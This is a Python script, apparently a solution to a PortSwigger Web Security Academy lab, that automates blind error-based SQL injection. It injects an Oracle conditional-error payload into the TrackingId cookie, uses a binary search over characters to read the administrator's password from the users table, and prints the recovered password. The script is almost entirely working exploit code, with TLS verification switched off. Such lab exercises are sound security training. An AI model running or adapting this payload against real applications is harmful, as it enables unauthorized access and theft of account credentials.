import requests
from bs4 import BeautifulSoup
from string import ascii_lowercase, digits
import urllib3

# чтобы не выводила предупреждение
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

arr_digits_letters = list(digits + ascii_lowercase)


def send_request(operator: str, simbol: str, n_sim_of_pass) -> bool:
        with requests.Session() as s:
            r = s.get(url,headers=headers,verify=False)
            original_cookies = s.cookies.get("TrackingId")
            modified_cookies = original_cookies + f"'||(SELECT CASE WHEN SUBSTR(password,{n_sim_of_pass},1){operator}'{simbol}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' -- ."
            cookies = dict(TrackingId=modified_cookies)
            soup = BeautifulSoup(r.text, 'html.parser')

            csrfToken = soup.find('input',attrs = {'name':'csrf'})['value']
            login_data['csrf'] = csrfToken
            r = s.post(url, data=login_data, headers=headers, cookies=cookies)
            if r.status_code >= 500:
                return True
            return False
                            


def binary_search(arr: list, n: int):
    low = 0
    high = len(arr) - 1
    while low <= high:
        middle = (low + high) // 2
        if send_request("=", arr[middle], n):
            return arr[middle]
        if send_request("<", arr[middle], n):
            high = middle - 1
        else:
            low = middle + 1
    
    return None


headers = {'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chromium/80.0.3987.160 Chrome/80.0.3987.163 Safari/537.36'
 }

login_data = {
             'username' : 'administrator',
             'password' : '123',
  }

url = 'https://ace61f431eaeb1e7c0fc025c00ac007e.web-security-academy.net/login'


if __name__ == "__main__":
    password_admin = ""
    i = 0
    n = 1
    while True:
        unswer = binary_search(arr_digits_letters, n)
        if unswer is not None:
            password_admin += unswer
            print(f"Find half of password: {password_admin}")
            n += 1
        else:
            break
    
    print(f"\n\n\n\npassword found: ({password_admin})")
